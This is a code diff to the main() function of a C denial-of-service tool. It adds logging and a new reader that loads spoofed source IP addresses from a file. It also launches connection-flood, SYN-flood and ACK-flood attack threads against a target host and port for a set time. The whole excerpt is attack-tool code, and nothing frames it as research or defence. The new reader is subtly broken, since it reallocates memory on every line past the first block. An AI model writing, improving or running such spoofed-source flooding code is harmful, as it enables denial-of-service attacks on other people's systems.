@@ -425,53 +425,55 @@ int main(int argc, char **argv)
                         fprintf(stderr, "use at least 1 thread\n");
                         return -1;
                     }
+                    printf("threads: %d\n", num_threads);
                     break;
                 case 's':
                     spoof_addresses_size = 1;
                     spoof_addresses = (uint32_t*)malloc(sizeof(uint32_t));
                     *spoof_addresses = leef_resolve_hostname(argv[++arg]);
+                    printf("spoof address: %s\n", argv[arg]);
                     break;
                 case 'n':
                     do_diagnostics = 0;
+                    printf("diagnostics disabled\n");
                     break;
                 case 'f': {
                     FILE *fp = fopen(argv[++arg], "r");
                     if(fp) {
                         char ip[32];
-                        int lines = 0;
-                        int ips = 0;
+                        int blocks = 1;
+                        int count = 0;
+                        const int block_size = 16384;
 
-                        fseek(fp, 0, SEEK_SET);
-                        while(!feof(fp)) {
-                            fgets(ip, 32, fp);
-                            if(strlen(ip) > 6)
-                                ips++;
-                            lines++;
-                        }
+                        spoof_addresses = (uint32_t *)malloc(sizeof(uint32_t) * blocks * block_size);
+                        spoof_addresses_size = 0;
 
-                        spoof_addresses = (uint32_t *)malloc(sizeof(uint32_t) * ips);
-                        spoof_addresses_size = ips;
-
-                        ips = 0;
+                        printf("reading spoofed ip addresses...");
                         fseek(fp, 0, SEEK_SET);
                         while(!feof(fp)) {
                             fgets(ip, 32, fp);
                             char *c;
-                            if((c = strchr(ip, '\n')) || (c = strchr(ip, '\r')))
+                            while((c = strchr(ip, '\n')) || (c = strchr(ip, '\r')) || (c = strchr(ip, ' ')))
                                 c[0] = 0;
-                            spoof_addresses[ips++] = leef_resolve_hostname(ip);
+                            spoof_addresses[spoof_addresses_size++] = leef_resolve_hostname(ip);
+                            count++;
+                            if(count >= block_size) {
+                                blocks++;
+                                spoof_addresses = (uint32_t *)realloc(spoof_addresses, sizeof(uint32_t) * blocks * block_size);
+                            }
                         }
-                        fprintf(stderr, "Read %d spoofed ip addresses from specified file\n", spoof_addresses_size);
+                        printf("[done]\n", spoof_addresses_size);
 
                         fclose(fp);
                     } else {
-                        fprintf(stderr, "Failed opening spoof ips file!\n");
+                        fprintf(stderr, "failed opening spoof ips file!\n");
                         return -1;
                     }
                     break;
                 }
                 case 't':
                     attack_time = (uint32_t)(atoi(argv[++arg]))*1000;
+                    printf("attack time: %d secs\n", attack_time / 1000);
                     break;
                 case 'd': {
                     FILE *fp = fopen(argv[++arg], "rb");
@@ -482,6 +484,7 @@ int main(int argc, char **argv)
                         send_data = (uint8_t *) malloc(send_data_size);
                         fread(send_data, send_data_size, 1, fp);
                         fclose(fp);
+                        printf("sending file %s as data on established connections\n", argv[arg]);
                     } else {
                         fprintf(stderr, "could not find data file %s\n", argv[arg]);
                         return -1;
@@ -489,16 +492,15 @@ int main(int argc, char **argv)
                     break;
                 }
                 default:
-                    fprintf(stderr, "incorrect option %s\n", opt);
+                    printf("incorrect option %s\n", opt);
                     return -1;
             }
         } else {
-            fprintf(stderr, "incorrect option %s\n", opt);
+            printf("incorrect option %s\n", opt);
             return -1;
         }
     }
 
-    printf("stating synack..\n");
     printf("target: %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
 
     pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * num_threads);
@@ -509,11 +511,13 @@ int main(int argc, char **argv)
 
     switch(attack_type) {
         case CONN_FLOOD:
+            printf("stating attack type: Connection flood\n");
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, conn_flood_attack_thread, NULL);
             conn_flood_sniff_thread(NULL);
             break;
         case SYN_FLOOD:
+            printf("stating attack type: SYN flood\n");
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, syn_flood_attack_thread, NULL);
             if(do_diagnostics)
@@ -524,6 +528,7 @@ int main(int argc, char **argv)
             }
             break;
         case ACK_FLOOD:
+            printf("stating attack type: ACK flood\n");
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
             if(do_diagnostics)
@@ -538,5 +543,9 @@ int main(int argc, char **argv)
     for(i=0;i<num_threads;++i)
         pthread_join(threads[i], NULL);
 
+    if(spoof_addresses)
+        free(spoof_addresses);
+
     return 0;
 }
+
